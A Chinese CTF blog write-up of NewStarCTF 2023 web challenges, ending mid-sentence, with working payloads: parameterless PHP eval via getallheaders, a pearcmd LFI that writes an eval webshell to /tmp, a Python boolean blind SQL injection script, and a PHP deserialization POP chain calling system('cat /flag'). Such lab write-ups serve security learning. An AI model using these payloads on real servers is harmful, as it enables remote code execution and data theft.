<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa974e4b0.png" alt="image-20240127233356332"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa936b032.png" alt="image-20240127233411157"></p>
<p>GGGGGGet</p>
<h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa940d821.png" alt="image-20240127192543606"></p>
<p>上来就是一个下马威 应该要整点信息泄露</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93ca0ab.png" alt="image-20240127194316310"></p>
<p>git泄露 被禁了</p>
<p>githack下来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa943ecfd.png" alt="image-20240127195156971"></p>
<p>bo0g1pop.php中有</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>严格等于分号  懵了</p>
<p>确实是没见过</p>
<p>if (‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\W]+((?R)?)&#x2F;‘, ‘’, $_GET[‘star’]))这是一个非常典型的无参数rce题</p>
<p>这里的正则表达式 [^\W]+((?R)?) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，<strong>它只能匹配和替换嵌套的函数调用，而不能处理函数参数</strong>。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，<strong>无参数rce就是不使用参数，而只使用一个个函数最终达到目的</strong>。</p>
<p>无参数rce可能用到的函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line">array_reverse() -逆转数组</span><br><span class="line">array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。</span><br><span class="line">array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，                         array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完               成后，就可以根据随机的键获取数组的随机值。</span><br><span class="line"> array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关键函数：</span><br><span class="line">getenv() ：获取环境变量的值  </span><br><span class="line">           php7.0以下返回bool(false)</span><br><span class="line">           php7.0以上正常回显</span><br><span class="line">           payload:</span><br><span class="line">           ?code=var_dump(getenv());</span><br><span class="line">           ?code=var_dump(getenv(phpinfo()));</span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">getallheaders()：获取所有 HTTP 请求标头，是apache_request_headers()的别名函                    数，但是该函数只能在Apache环境下使用</span><br><span class="line"></span><br><span class="line">                  payload:</span><br><span class="line">                  1) GET /1.php?code=eval(end(getallheaders()));                              HTTP/1.1</span><br><span class="line">                     .....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);</span><br><span class="line">                  2) GET /1.php?exp=eval(end(apache_request_headers()));                      HTTP/1.1</span><br><span class="line">                     ....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);      php7以上</span><br><span class="line">                    </span><br><span class="line">                     </span><br><span class="line">                     </span><br><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组，会返回$_GET</span><br><span class="line">                   ,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-                       &gt;post-&gt;cookie-&gt;files</span><br><span class="line">           current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也                        就是会返回$_GET变量的数组值</span><br><span class="line">          payload:</span><br><span class="line">          1） code=eval(end(current(get_defined_vars())));</span><br><span class="line">              &amp;flag=system(&#x27;ls&#x27;);    利用全局变量进RCE</span><br><span class="line">          2）flag=system(&#x27;id&#x27;);&amp;code=eval(pos(pos(get_defined_vars())));</span><br><span class="line">           </span><br><span class="line">           pos() 函数返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line">           该函数是 current() 函数的别名。</span><br><span class="line">                  </span><br><span class="line">                  </span><br><span class="line">                 </span><br><span class="line">session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回                      FALSE,返回参数给session_id()</span><br><span class="line">session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符               串（””）</span><br><span class="line">scandir()  文件读取</span><br></pre></td></tr></table></figure>

<p>太复杂了 没咋看懂 遇到题再来练吧</p>
<p>法1：</p>
<p>用array_flip()和array_rand()</p>
<p>?star&#x3D;eval(array_rand(array_flip(getallheaders())));</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9509e75.png" alt="image-20240128020145114"></p>
<p>cat flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94330c5.png" alt="image-20240128020515102"></p>
<p>法2：</p>
<p>用array_reverse()和pos</p>
<p>?star&#x3D;eval(pos(array_reverse(getallheaders())));</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9749981.png" alt="image-20240128020756998"></p>
<p>还必须要用X-Forwarder-Proto: ？</p>
<p>cat flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa961756e.png" alt="image-20240128021016609"></p>
<p>直接cat &#x2F;f*也可以</p>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>还有file协议可以用</p>
<p>?file&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo</p>
<p>?file&#x3D;phpinfo</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93d4c91.png" alt="image-20240131144457596"></p>
<p>这是啥啊</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93a2d42.png" alt="image-20240131150259656"></p>
<p>所以呢 虽然我感觉在哪里见过这个register_argc_argv </p>
<p>结合题目 应该要用pear文件</p>
<p>直接构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure>

<p>把<code>&lt;?=@eval($_POST[0]);?&gt;</code>写入了cmd.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa958ad2e.png" alt="image-20240131190513057"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/tmp/cmd</span><br><span class="line">post:0=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>



<p>懵了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa983b217.png" alt="image-20240131235659299"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9970580.png" alt="image-20240131235857961"></p>
<p>试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa96939b9.png" alt="image-20240201000302645"></p>
<p>终于好了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9b42c00.png" alt="image-20240201000441411"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa99da1a5.png" alt="image-20240201000501123"></p>
<p>flag{866ff3b3-4cd3-459a-ae7b-a008460ccb6b}</p>
<p>你猜是为什么会这样 明明我传到没问题 但是没实现命令 </p>
<p>直接url中get传参会把&lt;这些字符自动编码，就成功不了，所以用burp抓包再改回来，这个特别重要 我就是这里改少了 导致后边做不了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">它会把?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php</span><br><span class="line"></span><br><span class="line">改为?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=@eval($_POST[0]);?%3E+/tmp/cmd.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要改回来 然后就行了</p>
<h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9616954.png" alt="image-20240201170649597"></p>
<p>和上次那个很像</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa95006f1.png" alt="image-20240201170738191"></p>
<p>还是id</p>
<p>sqlmap跑不出来显示无参数可注入</p>
<p>sql盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1e69aee3-11f1-4a55-b4a2-8545b1633f65.node5.buuoj.cn:81//?id=TMP0919&#x27;AND &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;Ascii(Substr((Select flag from here_is_flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>--+&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;points&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 暂停1秒，降低爬取速度</span></span><br><span class="line">    </span><br><span class="line">    首先，导入了requests库，该库用于发送HTTP请求并获取响应。</span><br><span class="line">然后，定义了一个URL变量，用于存储要爬取的网页地址。</span><br><span class="line">接下来，初始化了一个空字符串result和一个计数器i。</span><br><span class="line">进入一个无限循环，在每次迭代中：</span><br><span class="line"></span><br><span class="line">计数器i递增<span class="number">1</span>，表示尝试获取下一个字符。</span><br><span class="line">设置一个范围head和tail，分别代表可能的ASCII码值的范围（这里设置为<span class="number">32</span>到<span class="number">126</span>）。</span><br><span class="line">使用二分查找算法在范围内找到中间值mid。</span><br><span class="line">构造一个payload字符串，其中包含当前计数器的值和中间ASCII码值。</span><br><span class="line">发送GET请求到目标URL，并将payload附加到URL后。将响应保存在变量r中。</span><br><span class="line">检查响应文本中是否包含<span class="string">&quot;points&quot;</span>关键字，如果存在，则将搜索范围缩小为[mid+<span class="number">1</span>, tail]；否则，将搜索范围缩小为[head, mid]。</span><br><span class="line">如果找到了目标字符（即head不等于<span class="number">32</span>），将其添加到结果字符串result中。</span><br><span class="line">如果未找到目标字符，跳出无限循环。</span><br><span class="line">打印结果字符串。</span><br><span class="line">为了降低爬取速度，添加了暂停<span class="number">1</span>秒的语句（time.sleep(<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>

<p>在week2的基础上，多过滤了union。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9407216.png" alt="image-20240201180835613"></p>
<p>是布尔盲注</p>
<p>两个脚本都可以</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa97b6605.png" alt="image-20240201180200670"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9579cb8.png" alt="image-20240201180658354"></p>
<p>flag{4549e50b-b8fe-423a-9d5c-9fcda9f82115}</p>
<h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>

<p>Begin::__destruct -&gt; Then::__toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</p>
<p>pop链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> </span><br><span class="line">class Begin&#123;</span><br><span class="line">    public $name;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Then&#123;</span><br><span class="line">    private $func;</span><br><span class="line">	</span><br><span class="line">	public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $s=new Super();</span><br><span class="line"> </span><br><span class="line">        $this-&gt;func=$s;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        ($this-&gt;func)();//这里把Super当函数调用，实际触发了Super()里面的__invoke方法</span><br><span class="line">        return &quot;Good Job!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Handle&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">	public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $this-&gt;obj=new CTF();//实例化CTF（）后给这里的obj赋值</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __call($func, $vars)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;obj-&gt;end();//调用了CTF（）里的end()方法</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Super&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">	public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $this-&gt;obj=new Handle();//为protected $obj赋值</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;obj-&gt;getStr();//Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 handle里的__call() 魔术方法</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function end()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;==GAME OVER==&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class CTF&#123;</span><br><span class="line">    public $handle;</span><br><span class="line"> </span><br><span class="line">    public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $w=new WhiteGod();</span><br><span class="line"> </span><br><span class="line">        $this-&gt;handle=$w;</span><br><span class="line"> </span><br><span class="line">    &#125; </span><br><span class="line">    public function end()</span><br><span class="line">    &#123;</span><br><span class="line">        unset($this-&gt;handle-&gt;log);//在这个end()方法中我们试图用unset（）删除WhiteGod()里面的log属性</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public $func=&#x27;system&#x27;;</span><br><span class="line">    public $var=&quot;cat /flag&quot;;</span><br><span class="line"> </span><br><span class="line">    public function __unset($var)</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;func)($this-&gt;var);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b=new Begin();</span><br><span class="line">$b-&gt;name=new Then();</span><br><span class="line">echo urlencode(serialize($b)); </span><br></pre></td></tr></table></figure>

<p>需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要特别注意的是在执行 unset($this-&gt;handle-&gt;log) 时，会尝试调用 $this-&gt;handle 对象的 __unset() 魔术方法。该方法将使用属性 $this-&gt;func 的值作为可调用函数，并将属性 $this-&gt;var 的值作为参数来执行。</span><br><span class="line"></span><br><span class="line">因此，在 WhiteGod 类中调用 unset($this-&gt;handle-&gt;log) 将实际上执行 ($this-&gt;func)($this-&gt;var)，相当于执行 system(&#x27;ls /&#x27;)，即执行系统命令 ls /</span><br><span class="line"></span><br><span class="line">整体来说是：</span><br><span class="line"></span><br><span class="line">__destruct() 中，由于 $name 包含一个 Then 对象，会触发 __toString() 魔术方法。在 __toString() 方法中，首先调用 $this-&gt;func 属性指向的对象（即 Super 对象），接下来进入 Super 类，由于该类含有一个 __invoke() 魔术方法，因此在调用 Super 对象时会触发 __invoke() 方法。在 __invoke() 方法中，又会调用 $this-&gt;obj-&gt;getStr() 方法，并进入 Handle 类中。</span><br><span class="line"></span><br><span class="line">由于 Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 __call() 魔术方法。在 __call() 方法中，将会调用 $this-&gt;obj-&gt;end() 方法，并触发 CTF 类中的 end() 方法。</span><br><span class="line"></span><br><span class="line">在 CTF 类的 end() 方法中，我们会调用 unset($this-&gt;handle-&gt;log)，从而触发 WhiteGod 类的 __unset() 魔术方法。在 __unset() 